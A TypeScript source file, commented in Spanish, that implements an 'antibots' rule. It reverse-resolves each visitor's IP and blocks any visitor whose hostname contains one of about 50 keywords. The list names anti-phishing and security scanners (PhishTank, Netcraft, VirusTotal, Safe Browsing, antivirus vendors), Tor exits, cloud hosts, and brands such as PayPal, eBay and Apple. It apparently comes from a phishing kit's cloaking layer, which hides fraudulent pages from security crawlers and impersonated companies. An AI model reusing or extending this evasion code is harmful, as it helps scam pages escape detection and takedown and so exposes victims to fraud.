/**
 * BlockHn — Sub-regla 3 de Guardian.
 *
 * Equivalente a App\Services\Antibots\Rules\Guard\BlockHn (PHP).
 *
 * Hace DNS reverso (PTR) de la IP del visitante y bloquea si el hostname
 * contiene alguno de los ~50 keywords (cloud providers, security scanners,
 * Tor, datacenters conocidos).
 *
 * Adaptación Edge: el `gethostbyaddr()` de PHP no existe en Edge runtime.
 * Usamos DNS-over-HTTPS de Cloudflare:
 *   GET https://cloudflare-dns.com/dns-query?name={REVERSED}.in-addr.arpa&type=PTR
 *   Accept: application/dns-json
 *
 * IPv4: convierte "1.2.3.4" → "4.3.2.1.in-addr.arpa".
 * IPv6: ignorado (los visitantes en Vercel suelen llegar con IPv4 vía proxy).
 *
 * Fail-open en cualquier error.
 */

import type { DetectionContext } from "../../detector";
import { isValidIp } from "../../helpers";
import { logDetection } from "../../log";

const BLOCKED_WORDS = [
  // Cloud providers / Datacenters
  "amazonaws", "azure", "google", "softlayer", "dreamhost", "vultr", "linode.com",
  "colocrossing.com", "ovh.net", "aruba", "oracle", "hosting",
  // Security / Scanners
  "cyveillance", "phishtank", "netcraft", "trendmicro", "sucuri.net", "bitdefender",
  "mcafee", "avg", "avira", "avast", "clamav", "drweb", "dr.web", "eset", "virustotal",
  "safebrowsing", "security", "antivirus", "phising",
  // Bots / Crawlers
  "msnbot", "crawler", "duckduck", "feedfetcher", "baidu", "pagepeeker",
  // Tor / Privacy
  "tor-exit", "torservers", "calyxinstitute",
  // Other
  "above", "netpilot", "p3pwgdsn", "ebay", "paypal", "messagelabs", "cloudflare",
  "twitter", "mailshell", "miniature", "tlh.ro", "dyn.plus.net", "geosr",
  "opendns", "cymru.com", "sl-reverse.com", "surriel.com", "orange-labs",
  "speedtravel", "metauri", "apple.com", "bruuk.sk", "sysms.net", "cisco",
  "amuri.net", "versanet.de", "hilfe-veripayed.com",
];

const CACHE_TTL_MS = 10 * 60 * 1000; // 10 min
const cache = new Map<string, { value: string | null; ts: number }>();

type DnsAnswer = { name?: string; type?: number; TTL?: number; data?: string };
type DohResponse = { Status?: number; Answer?: DnsAnswer[] };

function ipv4ToArpa(ip: string): string | null {
  const parts = ip.split(".");
  if (parts.length !== 4) return null;
  return parts.reverse().join(".") + ".in-addr.arpa";
}

async function reverseDnsLookup(ip: string): Promise<string | null> {
  // Solo IPv4 (los visitantes que pasan por Vercel/proxies normalmente vienen así)
  if (ip.includes(":")) return null;

  const cached = cache.get(ip);
  if (cached && Date.now() - cached.ts < CACHE_TTL_MS) return cached.value;

  const arpa = ipv4ToArpa(ip);
  if (!arpa) {
    cache.set(ip, { value: null, ts: Date.now() });
    return null;
  }

  const url = `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(
    arpa
  )}&type=PTR`;

  try {
    const res = await fetch(url, {
      headers: { Accept: "application/dns-json" },
      signal: AbortSignal.timeout(2000),
    });
    if (!res.ok) {
      cache.set(ip, { value: null, ts: Date.now() });
      return null;
    }
    const data = (await res.json()) as DohResponse;
    // type=12 → PTR. data viene con trailing dot ("hostname.example.com.")
    const ptr = data.Answer?.find((a) => a.type === 12)?.data;
    const hostname = ptr ? ptr.replace(/\.$/, "") : null;
    cache.set(ip, { value: hostname, ts: Date.now() });
    return hostname;
  } catch (e) {
    console.warn("[antibots:block-hn] DoH exception", ip, e);
    cache.set(ip, { value: null, ts: Date.now() });
    return null;
  }
}

function hostnameMatches(hostname: string): string | null {
  const lower = hostname.toLowerCase();
  for (const word of BLOCKED_WORDS) {
    if (lower.includes(word)) return word;
  }
  return null;
}

export async function runBlockHn(ctx: DetectionContext): Promise<boolean> {
  const { ip, ua, url } = ctx;
  if (!ip || !isValidIp(ip)) return false;

  const hostname = await reverseDnsLookup(ip);
  if (!hostname) return false; // fail-open / no PTR

  const matched = hostnameMatches(hostname);
  if (!matched) return false;

  await logDetection({
    type: "block_hn",
    ip,
    ua,
    url,
    reason: `hostname "${hostname}" contiene "${matched}"`,
    extra: { hostname },
  });
  return true;
}
